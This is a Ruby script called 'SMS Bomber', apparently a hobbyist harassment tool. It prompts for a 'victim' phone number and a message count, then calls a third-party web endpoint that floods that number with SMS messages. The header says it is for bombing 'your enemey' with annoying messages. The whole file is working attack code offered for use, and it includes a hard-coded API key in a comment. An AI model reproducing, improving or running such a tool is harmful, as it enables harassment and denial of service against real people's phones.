#!/usr/bin/ruby -w

#
#
#
#    SMS Bomber
#        Bomb your enemey by annoying message
#
#    Author : LittlEvil
#    Created on 8/5/2016
#    
# Requirtment : colorize
BEGIN {
	$VERBOSE = nil
	puts "+-----------------------------------------------------+"
}

def print(text)
	puts text
end
require 'net/http'
require 'open-uri'
require 'colorize'
def internet_connection?
  begin
    true if open("http://www.google.com/")
  rescue
    false
  end
end
def openF(link)
  begin
    true if open(link)
  rescue
    false
  end
end
banner = "
|                                                     |
|         <<<<<        SMS BOMBER        >>>>>        |
|                                                     |  
|         CODED BY LITTLEVIL  | SAHID ALMAS           |
|         CONTACT : fb.com/Android.Fire               |
+-----------------------------------------------------+
+-----------------------------------------------------+
    ENTER YOUR VICTIM MOBILE NO (WITH COUNTRY NO)  :::  
"
# Api Key 5513014a-364f-4eb5-bd63-584e7f473eb2
print(banner)
mobile_no = gets
print("   TIMES TO SEND SMS      (MAX : 75) ::: ")
times_x = gets
puts "[INFO] CHECKING INTERNET CONNECTION".green
	
puts "[INFO] SENDING REQUEST TO THE SERVER".green
if internet_connection? 
	puts "[INFO] INTERNET CONNECTION IS AVAILABLE".green
	if mobile_no.to_s.include? "+"
		mobile_no[0] = ""
	end
	times_x = times_x.to_s
	link = "http://amazetricks.com/smsbomb/?mob=%2B" +mobile_no +"&c=" + times_x
	
	begin
		# one line to make request
		openF(link.gsub(/\s+/, ""))
		puts "[INFO] DONE".green
	rescue
		puts "[ERROR] SOMETHING WENT WRONG".red
	end

else
	puts "[ERROR] INTERNET CONNECTION IS NOT AVAILABLE".red
end

END {
	puts "+-----------------------------------------------------+"
}
